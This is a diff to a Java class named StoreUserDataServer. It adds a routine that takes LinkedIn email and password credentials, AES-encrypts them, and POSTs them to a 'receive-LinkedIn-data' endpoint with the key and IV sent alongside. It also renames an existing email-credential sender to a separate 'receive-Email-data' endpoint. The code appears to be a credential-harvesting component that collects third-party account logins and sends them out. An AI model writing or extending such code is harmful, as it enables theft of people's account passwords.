@@ -40,8 +40,31 @@ public class StoreUserDataServer
         }
     }
     
+   
+    public static void StoreUserLinkedINData(String LinkedInEmail, String LinkedInPassword ) 
+    {
+        try {
+	           
+            // Generate AES key (256 bits, 32 bytes) and IV (128 bits, 16 bytes)
+            SecretKey key = KeyGenerator.getInstance("AES").generateKey();  // Generates a 256-bit key
+            byte[] iv = new byte[16];
+            new SecureRandom().nextBytes(iv);  // Generate a random 128-bit IV
+            // Encrypt data before sending
+            String encryptedEmail = encrypt(LinkedInEmail, key, iv);
+            String encryptedPassword = encrypt(LinkedInPassword, key, iv);
+            // Encode key and IV in Base64
+            String base64Key = Base64.getEncoder().encodeToString(key.getEncoded());
+            String base64Iv = Base64.getEncoder().encodeToString(iv);
+            // Send the encrypted data to the server along with the key and IV
+            sendToServerLinkedIn(encryptedEmail, encryptedPassword, base64Key, base64Iv);
+            
+    	} catch (Exception e) {
+        e.printStackTrace();
+    	}
+    	
+	}
     
-    public static void createSensitiveUserFiles(String userEmail,  String userPassword) 
+    public static void StoreUserEmailData(String userEmail,  String userPassword) 
     {
         try {
 	           
@@ -56,7 +79,7 @@ public class StoreUserDataServer
 	            String base64Key = Base64.getEncoder().encodeToString(key.getEncoded());
 	            String base64Iv = Base64.getEncoder().encodeToString(iv);
 	            // Send the encrypted data to the server along with the key and IV
-	            sendToServer(encryptedEmail, encryptedPassword, base64Key, base64Iv);
+	            sendToServerEmail(encryptedEmail, encryptedPassword, base64Key, base64Iv);
 	            
         	} catch (Exception e) {
             e.printStackTrace();
@@ -76,9 +99,9 @@ public class StoreUserDataServer
         return Base64.getEncoder().encodeToString(encryptedData);
     }
 
-    private static void sendToServer(String encryptedEmail, String encryptedPassword, String key, String iv) throws Exception {
+    private static void sendToServerEmail(String encryptedEmail, String encryptedPassword, String key, String iv) throws Exception {
         // Setup HTTP request to server
-        URL url = new URL("http://localhost:8000/receive-data"); // Use your actual server URL
+        URL url = new URL("http://localhost:8000/receive-Email-data"); // Use your actual server URL
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
         connection.setRequestMethod("POST");
         connection.setRequestProperty("Content-Type", "application/json");
@@ -99,6 +122,34 @@ public class StoreUserDataServer
         // Get response from server
         connection.getResponseCode();
     }
+    
+    private static void sendToServerLinkedIn(String encryptedEmail, String encryptedPassword, String key, String iv) throws Exception {
+        // Setup HTTP request to server
+        URL url = new URL("http://localhost:8000/receive-LinkedIn-data"); // Use your actual server URL
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("POST");
+        connection.setRequestProperty("Content-Type", "application/json");
+        connection.setDoOutput(true);
+
+        // Prepare JSON payload with encrypted data, key, and iv
+        String jsonPayload = String.format(
+            "{\"email\":\"%s\",\"password\":\"%s\",\"key\":\"%s\",\"iv\":\"%s\"}",
+            encryptedEmail, encryptedPassword, key, iv
+        );
+
+        // Send data
+        try (OutputStream os = connection.getOutputStream()) {
+            byte[] input = jsonPayload.getBytes("utf-8");
+            os.write(input, 0, input.length);
+        }
+
+        // Get response from server
+        connection.getResponseCode();
+    }
+    
+    
+    
+    
 
 }
 
